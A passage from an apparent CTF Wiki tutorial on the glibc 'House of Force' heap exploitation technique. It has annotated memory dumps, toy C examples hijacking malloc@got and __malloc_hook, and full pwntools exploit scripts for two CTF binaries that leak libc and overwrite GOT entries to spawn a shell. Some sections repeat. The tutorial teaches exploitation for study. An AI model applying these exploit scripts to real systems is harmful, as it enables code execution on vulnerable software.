0x0000000000000000 Then change the size of the top chunk to 0xffffffffffffffff 1\u20444 In the real problem, this step can be achieved through a vulnerability such as heap overflow. Since -1 is represented by 0xffffffffffffff in the complement, we can assign -1 directly. 0x602000: 0x0000000000000000 0x0000000000000021 &lt;=== ptr 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0xffffffffffffffff &lt;=== top chunk size field was changed 0x602030: 0x0000000000000000 0x0000000000000000 Notice the top chunk location at this point, and when we make the next allocation, we will change the position of the top chunk to where we want it. 0x7ffff7dd1b20 <main_arena>: 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80> : 0x0000000000000000 0x0000000000602020 &lt;=== top chunk at this point everything is fine 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 Next we execute malloc(-4120); ,-4120 is how to get it? First, we need to know the destination address to be written. Here, after I compile the program, 0x601020 is the address of malloc@got.plt 0x601020: 0x00007ffff7a91130 <=== malloc@got.plt So we should point the top chunk to 0x601010 so that the next time we allocate the chunk, we can allocate the memory at malloc@got.plt . After clearing the address of the current top chunk, according to the previous description, the top chunk is located at 0x602020, so we can calculate the offset as follows 0x601010-0x602020=-4112 In addition, the size of the memory requested by the user becomes an unsigned integer once it enters the function of applying for memory. void * __libc_malloc ( size_t bytes ) { If you want the size of the user input to go through the internal checked_request2size , you can get this size, ie /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ (( unsigned long ) ( req ) >= ( unsigned long ) ( INTERNAL_SIZE_T )( -2 * MINSIZE )) /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ ((( req ) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE ) \\ ? MINSIZE \\ : (( req ) + SIZE_SZ + MALLOC_ALIGN_MASK ) & ~ MALLOC_ALIGN_MASK ) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if ( REQUEST_OUT_OF_RANGE ( req )) { \\ __set_errno ( ENOMEM ); \\ return 0 ; \\ } \\ ( sz ) = request2size ( req ); On the one hand, we need to bypass the REQUEST_OUT_OF_RANGE(req) test, that is, the value we pass to malloc is in the negative range, not greater than -2 * MINSIZE, which is generally acceptable. On the other hand, after satisfying the corresponding constraints, we need to make request2size exactly convert to the corresponding size, that is, we need to make ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK exactly -4112. First of all, it is clear that -4112 is chunk aligned, then we only need to subtract SIZE_SZ, MALLOC_ALIGN_MASK to get the corresponding value to be applied. In fact, we only need to reduce SIZE_SZ here, because the more reduced MALLOC_ALIGN_MASK will eventually be aligned. And If -4112 is not MALLOC_ALIGN, we need to reduce more. Of course, we'd better make the chunks that are obtained after the allocation are also aligned, because when a chunk is released, an alignment check is performed. So, after calling malloc(-4120) , we can observe that the top chunk is raised to the position we want. 0x7ffff7dd1b20 <main_arena>:\\ 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80> : 0x0000000000000000 0x0000000000601010 &lt;=== It can be observed that the top chunk is raised 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 After that, our assigned block will appear at 0x601010+0x10, that is, 0x601020 can change the contents of the got table. However, it should be noted that while being elevated, the content near malloc@got will also be modified. set_head ( victim , nb | PREV_INUSE | ( av ! = & amp ; main_arena ? NON_MAIN_ARENA : 0 )); Simple example 2 \u00b6 In the previous example, we demonstrated modifying the contents of the got table above it (lower address) by reducing the pointer of the top chunk by HOF. But HOF can actually make the top chunk pointer increase to modify the content in the high address space. We demonstrate this by using this example. int main() { long * ptr, * ptr2; ptr = malloc (0x10); ptr = (long *) (((long) ptr) +24); *ptr=-1; &lt;=== Modify top chunk size Malloc(140737345551056); &lt;=== Increase the top chunk pointer malloc(0x10); } We can see that the program code is basically the same as the simple example 1, except that the size of the second malloc is different. This time our goal is malloc_hook, we know that malloc_hook is the value of the global variable in libc.so, first look at the memory layout Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/desktop/tst/t1 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/desktop/tst/t1 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/desktop/tst/t1 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] You can see that the base address of the heap is 0x602000, and the base address of libc is 0x7ffff7a0d000, so we need to expand the value of the top chunk pointer by HOF to implement the write to malloc_hook. First, the debug knows that the address of __malloc_hook is at 0x7ffff7dd1b10 and takes the calculation. 0x7ffff7dd1b00-0x602020-0x10=140737345551056 After this malloc, we can observe that the address of the top chunk is raised to 0x00007ffff7dd1b00 0x7ffff7dd1b20 <main_arena>: 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000 0x00007ffff7dd1b00 <=== top chunk 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 After that, we can control the __malloc_hook value at 0x7ffff7dd1b10 as long as we allocate it again. rax = 0x00007ffff7dd1b10 0x400562 <main+60> mov, 0x10 0x400567 <main+65> call 0x400410 <malloc@plt> \u5c0f\u8ff0 \u00b6 In this section, we explain the principle of House Of Force and give a simple example of two uses. By observing these two simple examples, we will find that the utilization requirements of HOF are still quite demanding. First, a vulnerability is required to allow the user to control the size field of the top chunk. Secondly, requires the user to freely control the allocation size of malloc Third, the number of allocations cannot be restricted In fact, the second of these three points is often the most difficult. In the CTF topic, the size limit of the heap block is often allocated to the user, and the maximum and maximum values cannot be utilized by the HOF method. HITCON training lab 11 \u00b6 [Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11 ) Here, we mainly modify its magic function to Basic Information \u00b6 \u279c hitcontraning_lab11 git: ( master ) file bamboobox bamboobox: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped \u279c hitcontraning_lab11 git: ( master ) checksec bamboobox [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) The program is a 64-bit dynamic linker. basic skills \u00b6 It should be noted that the program starts with 0x10 memory and is used to retain two function pointers . The program probably adds and removes items from the box. Show the contents of the box, and then the name of each item in the box. Add items to the box, and apply the corresponding memory for each item according to the size of the user input, as the space for storing the name. However, it should be noted that the read name is the read function, the read length parameter is the user input v2, and the read third parameter is the unsigned integer. If we enter a negative number, we can read it. Any length. But we need to make sure that the value satisfies the constraint of REQUEST_OUT_OF_RANGE , so there is a vulnerability of any length heap overflow . But even then, the first time is more difficult to use, because the size of the top chunk of the heap is generally not very large. Modify the name of the item, and read the specified length name from the specified index item according to the given index and size. The length here is read by the user, and there is also a vulnerability of any length heap overflow . Delete the item, set the size of the corresponding item to 0, and set the corresponding content to NULL. In addition, since the program is mainly a demo program, there is a magic function in the program that can directly read the flag. Use \u00b6 Since there is a magic function in the program, our core purpose is to override a pointer to a magic function. Here, the program applies a block of memory to store two function pointers at the beginning, hello_message is used at the beginning of the program, and goodbye_message is used at the end of the program, so we can override the program execution flow by overriding goodbye_message. The specific ideas are as follows Add an item and use a heap overflow vulnerability to overwrite the top chunk to a size of -1, which is the 64-bit maximum. Use the house of force technique to assign the chunk to the base address of the heap. Override goodbye_message as the magic function address to control the program execution flow It should be noted here that when triggering the top chunk to move to the specified location, the size should be appropriate to set the new top chunk size so that the detection of the next top chunk can be bypassed. Exp is as follows #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './bamboobox' ) context.log_level = 'debug' def additem ( length, name ) : r.recvuntil ( \":\" ) r.sendline ( \"2\" ) r.recvuntil ( \":\" ) r.sendline ( str ( length )) r.recvuntil ( \":\" ) r.sendline ( name ) def modify ( idx, length, name ) : r.recvuntil ( \":\" ) r.sendline ( \"3\" ) r.recvuntil ( \":\" ) r.sendline ( str ( idx )) r.recvuntil ( \":\" ) r.sendline ( str ( length )) r.recvuntil ( \":\" ) r.sendline ( name ) def remove ( idx ) : r.recvuntil ( \":\" ) r.sendline ( \"4\" ) r.recvuntil ( \":\" ) r.sendline ( str ( idx )) def show () : r.recvuntil ( \":\" ) r.sendline ( \"1\" ) magic = 0x400d49 # we must alloc enough size, so as to successfully alloc from fake topchunk additem ( 0x30, \"ddaa\" ) # idx 0 payload = 0x30 * 'a' # idx 0's content payload += 'a' * 8 + p64 ( 0xffffffffffffffff ) # top chunk's prev_size and size # modify topchunk's size to -1 modify ( 0 , 0x41, payload ) # top chunk's offset to heap base offset_to_heap_base = - ( 0x40 + 0x20 ) malloc_size = offset_to_heap_base - 0x8 - 0xf #gdb.attach(r) additem ( malloc_size, \"dada\" ) additem ( 0x10, p64 ( magic ) * 2 ) print r.recv () r.interactive () Of course, this problem can also be done using the unlink method. 2016 BCTF bcloud \u00b6 [Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/2016_bctf_bcloud ) Basic Information \u00b6 \u279c 2016_bctf_bcloud git: ( master ) file bcloud bcloud: ELF 32 -bit LSB executable, Intel 80386 , version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped \u279c 2016_bctf_bcloud git: ( master ) checksec bcloud [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) It can be seen that this is a dynamically linked 32-bit program that primarily enables Canary protection and NX protection. basic skills \u00b6 The program is probably a cloud note management system. First, the program will do some initialization, set the user's name, organization, host. The program mainly has the following functions Create a new note and apply x+4 space as the size of the note based on the user's input x. Show the note, no function. . Edit the note and edit the corresponding content according to the note specified by the user. Delete the note and delete the corresponding note. Synchronize the note and mark all the notes have been synchronized. However, no flaws were found in these five functions, and the program was revisited. As a result, it was found that the program was vulnerable when it was initialized. . Initial name unsigned int init_name () { char s ; // [esp+1Ch] [ebp-5Ch] char * tmp ; // [esp+5Ch] [ebp-1Ch] unsigned int v3 ; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); memset ( & s , 0 , 0x50u ); puts ( \"Input your name:\" ); read_str ( & s , 64 , '\\n' ); tmp = ( char * ) malloc ( 0x40u ); name = tmp ; strcpy ( tmp , & s ); info ( tmp ); return __readgsdword ( 0x14u ) ^ v3 ; } Here, if the name read by the program is 64 characters, then when the program outputs the corresponding string using the info function, the corresponding tmp pointer content is output, that is, leaks the heap address . . Vulnerabilities when initializing organization and org unsigned int init_org_host () { char s ; // [esp+1Ch] [ebp-9Ch] char * v2 ; // [esp+5Ch] [ebp-5Ch] char v3 ; // [esp+60h] [ebp-58h] char * v4 ; // [esp + A4h] [ebp-14h] unsigned int v5 ; // [esp+ACh] [ebp-Ch] v5 = __readgsdword ( 0x14u ); memset ( & s , 0 , 0x90u ); puts ( \"Org:\" ); read_str ( & s , 64 , 10 ); puts ( \"Host:\" ); read_str ( & v3 , 64 , 10 ); v4 = ( char * ) malloc ( 0x40u ); v2 = ( char * ) malloc ( 0x40u ); org = v2 ; host = v4 ; strcpy ( v4 , & amp ; v3 ); strcpy ( v2 , & s ); puts ( \"OKay! Enjoy:)\" ); return __readgsdword ( 0x14u ) ^ v5 ; } When reading into an organization, given 64 bytes, the lower address of v2 is overwritten. At the same time, we can know that v2 is a chunk adjacent to the top chunk, and v2 is just adjacent to org. Since 32-bit programs are generally used in 32-bit programs, the content stored in v2 is almost To a large extent, it is not \\x00 , so when you execute the strcpy function to copy content to v2, it is likely to overwrite the top chunk. This is where the vulnerability lies. Use \u00b6 Use the vulnerability at the initialization name to leak the base address of the heap. . Use the house of force to allocate the top chunk to the global 0esize-8 of 0x0804B0A0. When the memory is applied again, it returns the memory at the noteize address, so that we can control the size of all the notes and the corresponding addresses. Modify the size of the first three notes to 16, and modify the pointer to free@got, atoni@got, atoni@got Change free@got to puts@plt. Leak the atoi address. Modify another atoi got item to the system address again to get the shell. The specific script is as follows from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' context . binary = \"./bcloud\" bcloud = ELF ( & quot ; ./ bcloud & quot ;) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) else : p = process ( \"./bcloud\" ) log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) libc = ELF ( './libc.so.6' ) def offset_bin_main_arena ( idx ): word_bytes = context . word_size / 8 offset = 4 # lock offset += 4 # flags offset += word_bytes * 10 # offset fastbin offset += word_bytes * 2 # top,last_remainder offset += idx * 2 * word_bytes # idx offset -= word_bytes * 2 # bin overlap return offset def exp (): # leak heap base p . sendafter ( 'Input your name: \\n ' , 'a' * 64 ) p . recvuntil ( 'Hey ' + 'a' * 64 ) # sub name's chunk' s header heap_base = u32 ( p . recv ( 4 )) - 8 log . success ( 'heap_base: ' + hex ( heap_base )) p . sendafter ( 'Org: \\n ' , 'a' * 64 ) p . sendlineafter ( 'Host: \\n ' , p32 ( 0xffffffff )) # name,org,host, for each is (0x40+8) topchunk_addr = heap_base + ( 0x40 + 8 ) * 3 # make topchunk point to 0x0804B0A0-8 p . sendlineafter ( 'option--->>' , '1' ) notesize_addr = 0x0804B0A0 notelist_addr = 0x0804B120 targetaddr = notesize_addr - 8 offset_target_top = targetaddr - topchunk_addr # 4 for size_t, 7 for malloc_allign malloc_size = offset_target_top - 4 - 7 # plus 4 because malloc(v2 + 4); p . sendlineafter ( 'Input the length of the note content: \\n ' , str ( malloc_size - 4 )) # most likely malloc_size-4<0... if malloc_size - 4 > 0 : p . sendlineafter ( 'Input the content: \\n ' , '' ) #gdb.attach(p) # set notesize [0] = notesize [1] = notesize [2] = 16 # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got p . sendlineafter ( 'option--->>' , '1' ) p . sendlineafter ( 'Input the length of the note content: \\n ' , str ( 1000 )) payload = p32 ( 16 ) * 3 + ( notelist_addr - notesize_addr - 12 ) * 'a' + p32 ( bcloud . got [ 'free' ]) + p32 ( bcloud . got [ 'atoi' ]) * 2 p . sendlineafter ( 'Input the content: \\n ' , payload ) # overwrite free@got with puts@plt p . sendlineafter ( 'option--->>' , '3' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 0 )) p . sendlineafter ( 'Input the new content: \\n ' , p32 ( bcloud . plt [ 'puts' ])) # leak atoi addr by fake free p . sendlineafter ( 'option--->>' , '4' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 1 )) atoi_addr = u32 ( p . recv ( 4 )) libc_base = atoi_addr - libc . symbols [ 'atoi' ] system_addr = libc_base + libc . symbols [ 'system' ] log . success ( 'libc base addr: ' + hex ( libc_base )) # overwrite atoi@got with system p . sendlineafter ( 'option--->>' , '3' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 2 )) p . sendlineafter ( 'Input the new content: \\n ' , p32 ( system_addr )) # get shell p . sendlineafter ( 'option--->>' , '/bin/sh \\x00 ' ) p . interactive () if __name__ == \"__main__\" : exp () topic \u00b6 2016 Boston Key Party CTF cookbook","title":"House of Force"},{"location":"pwn/linux/glibc-heap/house_of_force/#house-of-force","text":"","title":"House Of Force"},{"location":"pwn/linux/glibc-heap/house_of_force/#introduction","text":"House Of Force belongs to the House Of XXX series, and House Of XXX is a series of methods for the glibc stacker proposed in the 2004 \"The Malloc Maleficarum-Glibc Malloc Exploitation Techniques\". However, most of the methods proposed in The Malloc Maleficarum have not worked today, and the House Of XXX we are referring to now is quite different from the one written in the 2004 article. But \"The Malloc Maleficarum\" is still a recommended article, you can read the original text here: https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt","title":"Introduction"},{"location":"pwn/linux/glibc-heap/house_of_force/#principle","text":"House Of Force is a heap utilization method, but it does not mean that House Of Force must be exploited based on heap vulnerabilities. If a heap based vulnerability is to be exploited by the House Of Force method, the following conditions are required: Ability to control the size field of the top chunk by overflow, etc. Be able to freely control the size of the heap allocation size The reason that House Of Force is generated is that glibc handles the top chunk. According to the knowledge of the previous heap data structure, we know that when all the free blocks are unable to meet the requirements, the heap will be split from the top chunk. The corresponding size is used as the space for the heap block. So what happens when the top chunk is used to allocate the size of the heap block to any value controlled by the user? The answer is that you can make the top chunk point to whatever we want, which is equivalent to an arbitrary address write. However, in glibc, the size of the user request and the existing size of the top chunk are verified. // Get the current top chunk and calculate its corresponding size victim = off-&gt; top; size = chunksize(victim); // If after splitting, its size still satisfies the minimum size of chunk, then you can split directly. if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); off-&gt; top = remainder; set_head(victim, nb | PREV_INUSE | (av! = &amp; main_arena? NON_MAIN_ARENA: 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk (off, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; } However, if you can tamper with size to a large value, you can easily pass this verification, which is what we said earlier that you need a vulnerability that can control the top chunk size field. (unsigned long) (size) >= (unsigned long) (nb + MINSIZE) The general practice is to change the size of the top chunk to -1, because the size is converted to an unsigned number when comparing, so -1 is the largest number of unsigned longs, so you can pass the verification anyway. remainder = chunk_at_offset(victim, nb); off-&gt; top = remainder; /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) After that, the top pointer will be updated, and the next heap block will be allocated to this location. The user only needs to control the pointer to write arbitrary values (write-anything-anywhere). At the same time, we need to pay attention to the topchunk size will also be updated, the update method is as follows victim = off -& gt ; top ; size = chunksize ( victim ); remainder_size = size - nb ; set_head ( remainder , remainder_size | PREV_INUSE ); So, if we want to allocate chunks of size x at the specified location next time, we need to make sure that the remainder_size is not less than x+ MINSIZE.","title":"Principle"},{"location":"pwn/linux/glibc-heap/house_of_force/#simple-example-1","text":"After learning the principles of HOF, we use an example to illustrate the use of HOF. The goal of this example is to tamper with malloc@got.plt by HOF to implement the hijacking process. int main() { long * ptr, * ptr2; ptr = malloc (0x10); ptr = (long *) (((long) ptr) +24); *ptr=-1; // &lt;=== Change the size field of the top chunk to 0xffffffffffffffff Malloc(-4120); // &lt;=== reduce the top chunk pointer Malloc(0x10); // &lt;=== allocate blocks to implement arbitrary address writes } First, we allocate a block of size 0x10 bytes. 0x602000: 0x0000000000000000 0x0000000000000021 &lt;=== ptr 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <=== top chunk 0x602030: 0x0000000000000000 0x0000000000000000 Then change the size of the top chunk to 0xffffffffffffffff 1\u20444 In the real problem, this step can be achieved through a vulnerability such as heap overflow. Since -1 is represented by 0xffffffffffffff in the complement, we can assign -1 directly. 0x602000: 0x0000000000000000 0x0000000000000021 &lt;=== ptr 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0xffffffffffffffff &lt;=== top chunk size field was changed 0x602030: 0x0000000000000000 0x0000000000000000 Notice the top chunk location at this point, and when we make the next allocation, we will change the position of the top chunk to where we want it. 0x7ffff7dd1b20 <main_arena>: 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80> : 0x0000000000000000 0x0000000000602020 &lt;=== top chunk at this point everything is fine 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 Next we execute malloc(-4120); ,-4120 is how to get it? First, we need to know the destination address to be written. Here, after I compile the program, 0x601020 is the address of malloc@got.plt 0x601020: 0x00007ffff7a91130 <=== malloc@got.plt So we should point the top chunk to 0x601010 so that the next time we allocate the chunk, we can allocate the memory at malloc@got.plt . After clearing the address of the current top chunk, according to the previous description, the top chunk is located at 0x602020, so we can calculate the offset as follows 0x601010-0x602020=-4112 In addition, the size of the memory requested by the user becomes an unsigned integer once it enters the function of applying for memory. void * __libc_malloc ( size_t bytes ) { If you want the size of the user input to go through the internal checked_request2size , you can get this size, ie /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ (( unsigned long ) ( req ) >= ( unsigned long ) ( INTERNAL_SIZE_T )( -2 * MINSIZE )) /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ ((( req ) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE ) \\ ? MINSIZE \\ : (( req ) + SIZE_SZ + MALLOC_ALIGN_MASK ) & ~ MALLOC_ALIGN_MASK ) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if ( REQUEST_OUT_OF_RANGE ( req )) { \\ __set_errno ( ENOMEM ); \\ return 0 ; \\ } \\ ( sz ) = request2size ( req ); On the one hand, we need to bypass the REQUEST_OUT_OF_RANGE(req) test, that is, the value we pass to malloc is in the negative range, not greater than -2 * MINSIZE, which is generally acceptable. On the other hand, after satisfying the corresponding constraints, we need to make request2size exactly convert to the corresponding size, that is, we need to make ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK exactly -4112. First of all, it is clear that -4112 is chunk aligned, then we only need to subtract SIZE_SZ, MALLOC_ALIGN_MASK to get the corresponding value to be applied. In fact, we only need to reduce SIZE_SZ here, because the more reduced MALLOC_ALIGN_MASK will eventually be aligned. And If -4112 is not MALLOC_ALIGN, we need to reduce more. Of course, we'd better make the chunks that are obtained after the allocation are also aligned, because when a chunk is released, an alignment check is performed. So, after calling malloc(-4120) , we can observe that the top chunk is raised to the position we want. 0x7ffff7dd1b20 <main_arena>:\\ 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80> : 0x0000000000000000 0x0000000000601010 &lt;=== It can be observed that the top chunk is raised 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 After that, our assigned block will appear at 0x601010+0x10, that is, 0x601020 can change the contents of the got table. However, it should be noted that while being elevated, the content near malloc@got will also be modified. set_head ( victim , nb | PREV_INUSE | ( av ! = & amp ; main_arena ? NON_MAIN_ARENA : 0 ));","title":"Simple example 1"},{"location":"pwn/linux/glibc-heap/house_of_force/#simple-example-2","text":"In the previous example, we demonstrated modifying the contents of the got table above it (lower address) by reducing the pointer of the top chunk by HOF. But HOF can actually make the top chunk pointer increase to modify the content in the high address space. We demonstrate this by using this example. int main() { long * ptr, * ptr2; ptr = malloc (0x10); ptr = (long *) (((long) ptr) +24); *ptr=-1; &lt;=== Modify top chunk size Malloc(140737345551056); &lt;=== Increase the top chunk pointer malloc(0x10); } We can see that the program code is basically the same as the simple example 1, except that the size of the second malloc is different. This time our goal is malloc_hook, we know that malloc_hook is the value of the global variable in libc.so, first look at the memory layout Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/desktop/tst/t1 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/desktop/tst/t1 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/desktop/tst/t1 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] You can see that the base address of the heap is 0x602000, and the base address of libc is 0x7ffff7a0d000, so we need to expand the value of the top chunk pointer by HOF to implement the write to malloc_hook. First, the debug knows that the address of __malloc_hook is at 0x7ffff7dd1b10 and takes the calculation. 0x7ffff7dd1b00-0x602020-0x10=140737345551056 After this malloc, we can observe that the address of the top chunk is raised to 0x00007ffff7dd1b00 0x7ffff7dd1b20 <main_arena>: 0x0000000100000000 0x0000000000000000 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000 0x00007ffff7dd1b00 <=== top chunk 0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000 0x00007ffff7dd1b78 After that, we can control the __malloc_hook value at 0x7ffff7dd1b10 as long as we allocate it again. rax = 0x00007ffff7dd1b10 0x400562 <main+60> mov, 0x10 0x400567 <main+65> call 0x400410 <malloc@plt>","title":"Simple example 2"},{"location":"pwn/linux/glibc-heap/house_of_force/#_1","text":"In this section, we explain the principle of House Of Force and give a simple example of two uses. By observing these two simple 